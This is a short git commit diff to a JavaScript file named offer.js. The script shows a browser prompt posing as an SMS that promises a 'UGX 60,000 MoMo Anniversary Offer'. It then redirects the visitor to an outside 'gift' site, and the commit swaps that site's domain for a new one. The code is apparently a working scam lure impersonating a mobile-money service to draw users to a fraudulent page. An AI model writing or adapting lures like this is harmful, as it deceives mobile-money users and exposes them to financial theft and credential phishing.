94e56cfce5c011d6c7a31fc9a06af24aabe2d213
kenycruzk <kenycruzk@gmail.com>
2025-05-05 07:22:30 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -2,5 +2,5 @@
 var password = 'UGX 60,000'
 password=prompt('SMS: Congratulations Your MoMo Account is Eligible to receive UGX 60,000 MoMo Anniversary Offer, Kindly Press OK to PROCEED ','UGX 60,000');
 if (password != 'UGX 60,000') {
-location.href='https://momo-ug.alloffers.org/gift';
+location.href='https://momo-ug.alloffer.pro/gift';
 }
